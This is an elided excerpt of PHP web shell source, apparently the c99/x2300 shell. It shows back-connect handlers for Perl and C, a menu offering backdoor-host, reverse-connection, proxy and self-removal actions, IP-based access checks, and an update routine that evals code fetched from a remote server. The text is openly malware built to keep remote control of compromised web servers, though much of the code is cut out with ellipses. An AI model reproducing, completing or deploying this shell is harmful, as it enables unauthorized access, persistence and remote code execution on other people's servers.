...
if (!empty($_POST['backconnectport']) && ('shbd' == $_POST['use'])) {
...
if (!empty($_POST['backconnectip']) && !empty($_POST['backconnectport']) && ('Perl' == $_POST['use'])) {
    if (is_writable('.')) {
...
if (!empty($_POST['backconnectip']) && !empty($_POST['backconnectport']) && ('C' == $_POST['use'])) {
    if (is_writable('.')) {
...
if (empty($dizin)) {
    $dizin = realpath('.');
} elseif (realpath($dizin)) {
    $dizin = realpath($dizin);
}
$dizin = str_replace('\\', DIRECTORY_SEPARATOR, $dizin);
if (DIRECTORY_SEPARATOR != substr($dizin, -1)) {
...
$quicklaunch = [
 ...
 ['<br><center><b>[Enumerate]</b>', $enumerate],
 ...
 ['<b>[Backdoor Host]</b>', $surl . 'act=shbd'],
 ['<b>[Back-Connection]</b>', $surl . 'act=backc'],
 ['<b>[milw0rm it!]</b>', $millink],
 ['<b>[PHP-Proxy]</b>', $phprox],
 ['<b>[Self remove]</b></center>', $surl . 'act=selfremove'],
];
...
if (!preg_match($s, getenv('REMOTE_ADDR')) and !preg_match($s, gethostbyaddr(getenv('REMOTE_ADDR')))) {
    exit('<a href="http://locus7s.com/">x2300 Shell</a>: Access Denied - your host (' . getenv('REMOTE_ADDR') . ') not allow');
}
if (!empty($login)) {
    if (empty($md5_pass)) {
        $md5_pass = md5($pass);
    ...
    if (!function_exists('c99sh_getupdate')) {
        function c99sh_getupdate($update = true)
        {
            ...
            if (!$data) {
                ...
                if ("\x99" == $data[0] and "\x01" == $data[1]) {
                    return 'Error: ' . $string;

                    return false;
                }
                if ("\x99" == $data[0] and "\x02" == $data[1]) {
                    return 'You are using latest version!';
                }
                if ("\x99" == $data[0] and "\x03" == $data[1]) {
                ...
                } elseif ("\x99" == $data[0] and "\x04" == $data[1]) {
                    eval($string);
...
$d = str_replace('\\', DIRECTORY_SEPARATOR, $d);
    ...
    if ((!empty($donated_html)) and (in_array($act, $donated_act))) {
        echo '<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1><tr><td width="100%" valign="top">' . $donated_html . '</td></tr></table><br>';
    }
